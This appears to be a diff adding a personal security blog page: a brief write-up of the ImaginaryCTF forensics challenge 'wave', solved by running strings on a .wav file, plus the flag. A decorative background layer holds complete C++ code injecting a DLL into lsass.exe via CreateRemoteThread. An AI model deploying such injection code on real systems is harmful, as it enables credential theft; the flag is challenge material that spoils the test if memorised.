@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ImaginaryCTF Forensics - wave</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="ImaginaryCTF Forensics - wave" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>ImaginaryCTF Forensics - wave</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <hr />
+
+<h2 id="objective"><strong>Objective</strong></h2>
+<p>We are given a <code class="language-plaintext highlighter-rouge">.wav</code> file and the following hint:
+not a steg challenge i promise</p>
+
+<p>Attachments provided: /assets/img/ctf_assets/wave.wav</p>
+
+<p>The goal is to find the flag hidden within this file.</p>
+
+<hr />
+
+<h2 id="initial-thoughts"><strong>Initial Thoughts</strong></h2>
+<p>The hint clearly states that <strong>this is not a steganography challenge</strong>.<br />
+This suggests we <strong>shouldn’t waste time using tools like <code class="language-plaintext highlighter-rouge">binwalk</code>, <code class="language-plaintext highlighter-rouge">zsteg</code>, or deep audio analysis</strong>.</p>
+
+<p>Instead, we should <strong>start with the basics</strong>:</p>
+<ul>
+  <li>Run <code class="language-plaintext highlighter-rouge">strings</code> to search for any readable text inside the file.</li>
+  <li>Look at file metadata, as <code class="language-plaintext highlighter-rouge">.wav</code> files often contain comments or metadata sections.</li>
+</ul>
+
+<hr />
+
+<h2 id="exploration"><strong>Exploration</strong></h2>
+
+<p>We begin by listing the directory contents:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wave.wav
+</code></pre></div></div>
+<p>Now, let’s run strings on the file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings wave.wav | <span class="nb">head</span> <span class="nt">-n</span> 10
+</code></pre></div></div>
+<p>Output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>COMM
+ictf<span class="o">{</span>obligatory_metadata_challenge<span class="o">}</span>
+RIFF
+WAVEfmt 
+data8
+%	b	
+<span class="o">)</span>	h	
+?	w	
+	W	Y
+ 	<span class="o">]</span>	
+</code></pre></div></div>
+<h3 id="analysis">Analysis</h3>
+<p>From the very first few lines, we immediately spot the flag:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ictf<span class="o">{</span>obligatory_metadata_challenge<span class="o">}</span>
+</code></pre></div></div>
+<p>This confirms the challenge was purely about checking the file metadata or raw contents — no hidden data or steganography required.</p>
+
+<h3 id="why-this-approach-works">Why This Approach Works</h3>
+<ul>
+  <li>The challenge explicitly hinted:
+  “not a steg challenge i promise”
+This suggests that basic inspection is the correct path.</li>
+  <li>.wav files can store metadata tags like:</li>
+  <li>COMM (Comments)</li>
+  <li>RIFF (Standard header structure)
+Running strings revealed that the flag was stored in the COMM (comment) section.- Using complex steganography tools like binwalk would be unnecessary and a waste of time here.
+—
+    <h2 id="final-flag">Final Flag</h2>
+    <p>The flag is:</p>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ictf<span class="o">{</span>obligatory_metadata_challenge<span class="o">}</span>
+</code></pre></div>    </div>
+    <hr />
+  </li>
+</ul>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
